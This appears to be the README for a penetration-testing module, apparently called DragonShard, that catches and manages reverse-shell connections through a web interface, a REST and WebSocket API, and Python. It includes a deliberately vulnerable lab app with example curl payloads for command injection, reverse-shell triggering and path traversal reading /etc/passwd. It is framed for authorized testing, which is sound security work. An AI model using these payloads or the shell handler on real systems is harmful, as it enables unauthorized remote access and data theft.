# DragonShard Reverse Shell Handler

This module provides native reverse shell handling capabilities for DragonShard, allowing you to capture and manage reverse shell connections just like netcat, but with enhanced features like dynamic port allocation, console history, and web-based management.

## Features

- **Dynamic Port Allocation**: Automatically assigns available ports for reverse shell listeners
- **Console History**: Maintains complete console history for each connection
- **Web-Based Management**: Manage connections through the DragonShard web interface
- **Real-Time Interaction**: Send commands and receive output in real-time via WebSocket
- **Connection Management**: Track connection status, remote addresses, and activity
- **Auto-Cleanup**: Automatically close inactive connections
- **Comprehensive Testing**: Full test suite with vulnerable application for testing

## Architecture

### Core Components

1. **ReverseShellHandler**: Main class for managing reverse shell connections
2. **PortAllocator**: Manages dynamic port allocation and availability
3. **ShellConnection**: Data structure for connection information
4. **WebSocket Integration**: Real-time communication for console interaction
5. **API Endpoints**: REST API for connection management

### File Structure

```
dragonshard/
├── executor/
│   └── reverse_shell.py          # Core reverse shell handler
├── visualizer/
│   ├── api/
│   │   └── endpoints/
│   │       └── reverse_shells.py # API endpoints
│   └── frontend/
│       └── public/
│           └── reverse-shell.html # Web interface
└── tests/
    └── test_reverse_shell.py     # Unit tests
```

## Quick Start

### 1. Start the DragonShard API

```bash
# Start the visualization API with reverse shell support
make start-visualization-api
```

### 2. Access the Web Interface

Open your browser and navigate to:
- **Main Interface**: http://localhost:8000
- **Reverse Shell Manager**: http://localhost:8000/static/reverse-shell.html

### 3. Create a Listener

1. In the web interface, click "Create Listener"
2. Optionally specify a port (auto-assigned if empty)
3. Set timeout and auto-close preferences
4. Click "Create Listener"

### 4. Test with Vulnerable Application

```bash
# Start the vulnerable test application
cd test-env/reverse-shell-test
docker-compose up vulnerable-app

# The vulnerable app will be available at http://localhost:8080
```

### 5. Trigger a Reverse Shell

Visit the vulnerable application and use the reverse shell endpoint:
```
http://localhost:8080/reverse-shell?host=<your-ip>&port=<your-port>
```

## API Reference

### Endpoints

#### Create Listener
```http
POST /api/v1/reverse-shells/listeners
Content-Type: application/json

{
  "port": 4444,           // Optional, auto-assigned if not provided
  "auto_close": true,      // Auto-close inactive connections
  "timeout": 300          // Timeout in seconds
}
```

#### Get All Connections
```http
GET /api/v1/reverse-shells/connections
```

#### Get Connection Info
```http
GET /api/v1/reverse-shells/connections/{connection_id}
```

#### Send Command
```http
POST /api/v1/reverse-shells/connections/{connection_id}/send
Content-Type: application/json

{
  "command": "ls -la"
}
```

#### Get Console History
```http
GET /api/v1/reverse-shells/connections/{connection_id}/history?limit=100
```

#### Close Connection
```http
DELETE /api/v1/reverse-shells/connections/{connection_id}
```

#### Cleanup Inactive Connections
```http
POST /api/v1/reverse-shells/cleanup
Content-Type: application/json

{
  "timeout_seconds": 300
}
```

### WebSocket API

Connect to the WebSocket endpoint for real-time interaction:

```javascript
const ws = new WebSocket(`ws://localhost:8000/api/v1/reverse-shells/ws/${connection_id}`);

// Send command
ws.send(JSON.stringify({
  type: "command",
  command: "whoami"
}));

// Receive data
ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  console.log(data);
};
```

## Python API Usage

### Basic Usage

```python
from dragonshard.executor.reverse_shell import ReverseShellHandler

# Initialize handler
handler = ReverseShellHandler(base_port=4444, max_ports=10)

# Create a listener
connection_id = handler.create_listener(port=4444)

# Send a command (if connection is active)
success = handler.send_command(connection_id, "ls -la")

# Get console history
history = handler.get_console_history(connection_id, limit=100)

# Close connection
handler.close_connection(connection_id)
```

### Advanced Usage with Callbacks

```python
def on_data_received(connection_id: str, data: str):
    print(f"Data from {connection_id}: {data}")

def on_connection_established(connection_id: str, data: dict):
    print(f"Connection established: {connection_id}")
    print(f"Remote: {data.get('remote_address')}:{data.get('remote_port')}")

# Register callbacks
handler.register_callback('data', on_data_received)
handler.register_callback('connection', on_connection_established)

# Create listener
connection_id = handler.create_listener()
```

## Testing

### Unit Tests

```bash
# Run reverse shell unit tests
make test-reverse-shell

# Run demo script
make test-reverse-shell-demo
```

### Integration Tests

```bash
# Run complete integration test suite
cd test-env/reverse-shell-test
docker-compose up
```

### Manual Testing

1. **Start the vulnerable application**:
   ```bash
   cd test-env/reverse-shell-test
   docker-compose up vulnerable-app
   ```

2. **Create a listener** in the web interface

3. **Trigger a reverse shell**:
   ```bash
   # From the vulnerable container
   curl "http://localhost:8080/reverse-shell?host=host.docker.internal&port=4444"
   ```

4. **Interact with the shell** through the web interface

## Vulnerable Application

The test environment includes a vulnerable Python application with multiple vulnerabilities:

### Endpoints

- **`/`**: Main page with vulnerability links
- **`/ping?host=<target>`**: Command injection vulnerability
- **`/reverse-shell?host=<target>&port=<port>`**: Reverse shell trigger
- **`/file?path=<path>`**: Path traversal vulnerability

### Example Exploits

```bash
# Command injection
curl "http://localhost:8080/ping?host=127.0.0.1;whoami"

# Reverse shell
curl "http://localhost:8080/reverse-shell?host=<your-ip>&port=4444"

# Path traversal
curl "http://localhost:8080/file?path=/etc/passwd"
```

## Security Considerations

### Important Notes

1. **For Testing Only**: This functionality is designed for penetration testing and security research
2. **Network Isolation**: Always test in isolated environments
3. **Port Management**: Be aware of port conflicts and firewall rules
4. **Logging**: All activities are logged for audit purposes

### Best Practices

1. **Use in Controlled Environments**: Only use in authorized testing environments
2. **Monitor Connections**: Regularly check for active connections
3. **Clean Up**: Always close connections when done
4. **Network Security**: Ensure proper network segmentation

## Configuration

### Environment Variables

- `DRAGONSHARD_BASE_PORT`: Base port for allocation (default: 4444)
- `DRAGONSHARD_MAX_PORTS`: Maximum ports to allocate (default: 100)
- `DRAGONSHARD_TIMEOUT`: Default connection timeout (default: 300)

### Handler Configuration

```python
handler = ReverseShellHandler(
    base_port=4444,      # Starting port for allocation
    max_ports=10,        # Maximum number of ports
)
```

## Troubleshooting

### Common Issues

1. **Port Already in Use**:
   - Check if port is already allocated
   - Use auto-allocation instead of specific port
   - Clean up inactive connections

2. **Connection Not Established**:
   - Verify firewall settings
   - Check network connectivity
   - Ensure vulnerable app is running

3. **WebSocket Connection Failed**:
   - Check if API is running
   - Verify connection ID is valid
   - Check browser console for errors

### Debug Mode

Enable debug logging:

```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

## Development

### Adding New Features

1. **Extend ReverseShellHandler**: Add new methods to the main handler class
2. **Update API Endpoints**: Add corresponding REST endpoints
3. **Update Web Interface**: Add UI components for new features
4. **Add Tests**: Create unit and integration tests

### Contributing

1. Follow the existing code style
2. Add comprehensive tests
3. Update documentation
4. Test with the vulnerable application

## License

This module is part of DragonShard and follows the same license terms.

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review the test cases
3. Check the API documentation
4. Open an issue in the repository 